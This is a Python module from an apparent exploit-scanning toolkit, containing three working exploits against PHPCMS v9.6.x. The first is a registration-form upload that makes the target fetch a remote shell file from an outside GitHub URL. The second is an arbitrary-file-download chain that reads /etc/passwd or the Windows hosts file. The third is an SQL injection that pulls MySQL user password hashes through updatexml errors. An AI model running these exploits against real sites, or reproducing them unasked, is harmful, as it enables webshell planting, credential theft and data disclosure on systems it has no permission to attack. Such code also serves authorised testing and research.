from ClassCongregation import _urlparse
from requests_toolbelt.utils import dump
from operator import methodcaller
import prettytable as pt
import requests,re
import CodeTest
################
##--PHPCMS--##
#CVE_PHPcms_1  [upload]，默认VULN = None
################
#echo VuLnEcHoPoCSuCCeSS
#VULN = None => 漏洞测试
#VULN = True => 命令执行
VULN = ''
TIMEOUT = ''

class PHPCMS():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
    
    def _CVE_PHPcms_1(self):
        self.pocname = "PHPCMS:CVE_PHPcms_1"
        self.method = "post"
        self.rawdata = "null"
        self.info = "[upload]"
        self.r = "PoCWating"

        self.path = "/index.php?m=member&c=index&a=register&siteid=1"
        self.data = "siteid=1&modelid=2&username=testxxx&password=testxxxxx&email=test@texxxst.com&info[content]=<img src=https://raw.githubusercontent.com/SecWiki/CMS-Hunter/master/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/shell.txt?.php#.jpg>&dosubmit=1"
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            if VULN == 'False':
                self.request = requests.post(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                if len(re.findall(r'&lt;img src=(.*)&gt', request.text)):
                    self.r = "PoCSuCCeSS"
                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                else:
                    CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.post(self.url + self.path, data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def _CVE_PHPcms_2(self):
        self.pocname = "PHPCMS:CVE_PHPcms_2"
        self.method = "post"
        self.rawdata = "null"
        self.info = "[dowload]"
        self.r = "PoCWating"
        try:
            r = requests.get(self.url + '/Index.php')
            if r.status_code == 200:
                os = 'WINDOWS'
            else:
                os = 'LINUX'

            s = requests.Session()

            r = s.get(self.url +'/index.php?m=wap&c=index&a=init&siteid=1')
            cookie_siteid =  r.headers['set-cookie']
            cookie_siteid = cookie_siteid[cookie_siteid.index('=')+1:]

            if os == 'WINDOWS':
                url = self.url + '/index.php?m=attachment&c=attachments&&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dc:Windows/System32/drivers/etc/host%26f%3Ds%3%25252%2*70C'
            else:
                url = self.url + '/index.php?m=attachment&c=attachments&&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D/etc/passw%26f%3Dd%3%25252%2*70C'  

            post_data = {
                'userid_flash':cookie_siteid
            }

            r = s.post(url, post_data)
            cookie_att_json = ''
            for cookie in s.cookies:
                if '_att_json' in cookie.name:
                    cookie_att_json = cookie.value
            
            r = s.get(self.url + '/index.php?m=content&c=down&a=init&a_k=' + cookie_att_json)
            
            if 'm=content&c=down&a=download&a_k=' in r.text:
                start = r.text.index('download&a_k=')
                end = r.text.index('" class="xzs')
                download_url = r.text[start+13:end]
                download_url = self.url + '/index.php?m=content&c=down&a=download&a_k=' + download_url
                r = s.get(download_url)

                if os == 'WINDOWS': # windows hosts file
                    if 'HOSTS file' in r.text:
                        self.r = "PoCSuCCeSS"
                else:
                    if 'root:x:0:0' in r.text:
                        self.r = "PoCSuCCeSS"
            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
    

    def _CVE_PHPcms_3(self):
        self.pocname = "PHPCMS:PHPCMS_v96_sqli_BaseVerify"
        self.method = "post"
        self.rawdata = "null"
        self.info = "[sql]"
        self.r = "PoCWating"
        self.headers = {
            "Content-Type":"application/x-www-form-urlencoded", 
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        try:
            url_prefix = self.url + "/index.php?m=wap&c=index&a=init&siteid=1"
            tmp_cookie = {}
            req = requests.get(url_prefix, headers=self.headers, timeout=TIMEOUT, verify=False)
            for cookie in req.cookies:
                tmp_cookie = cookie.value
            
            post_data = {
                "userid_flash":tmp_cookie
            }
            url_suffix = self.url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id="\
            "%*27%20and%20updatexml%281%2Cconcat%280x7e%2C%28select%20SUBSTRING%28password,30%29%20from%20mysql.user%20limit%200,1%29%29%2C0x7e%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"

            req2 = requests.post(url_suffix, data=post_data, headers=self.headers, timeout=TIMEOUT, verify=False)
            for cookie in req2.cookies:
                tmp_cookie = cookie.value

            vulnurl = self.url + "/index.php?m=content&c=down&a_k="+str(tmp_cookie)

            req3 = requests.get(vulnurl, headers=self.headers, timeout=TIMEOUT, verify=False)
            if r"XPATH syntax error" in req3.text:
                self.r = "PoCSuCCeSS"
            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

tb = pt.PrettyTable()
tb.field_names = ["Target type", "Vuln Name", "Poc", "Exp", "Impact Version && Vulnerability description"]
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
print_result_1 = ("PHPCMS", "CVE_PHPcms_1" ,"N" ,"Y" ,"PHPCMS_v9.6.0, [upload]")
print_result_2 = ("PHPCMS", "CVE_PHPcms_2" ,"N" ,"Y" ,"PHPCMS_v9.6.2, [dowload]")
print_result_3 = ("PHPCMS", "CVE_PHPcms_3" ,"N" ,"Y" ,"PHPCMS_v9.6.0, [sql]")
tb.add_row(print_result_1)
tb.add_row(print_result_2)
tb.add_row(print_result_3)
print(tb)

def check(**kwargs):
    global VULN,TIMEOUT
    VULN = kwargs['vuln']
    TIMEOUT = int(kwargs['timeout'])
    CodeTest.Verification.CMD = kwargs['cmd']
    CodeTest.Verification.VULN = kwargs['vuln']
    if VULN == 'False':
        ExpPHPCMS = globals()['PHPCMS'](_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpPHPCMS = globals()['PHPCMS'](_urlparse(kwargs['url']),kwargs['cmd'])

    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpPHPCMS, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
    else:#调用所有函数
        for func in dir(PHPCMS):
            if not func.startswith("__"):
                methodcaller(func)(ExpPHPCMS)







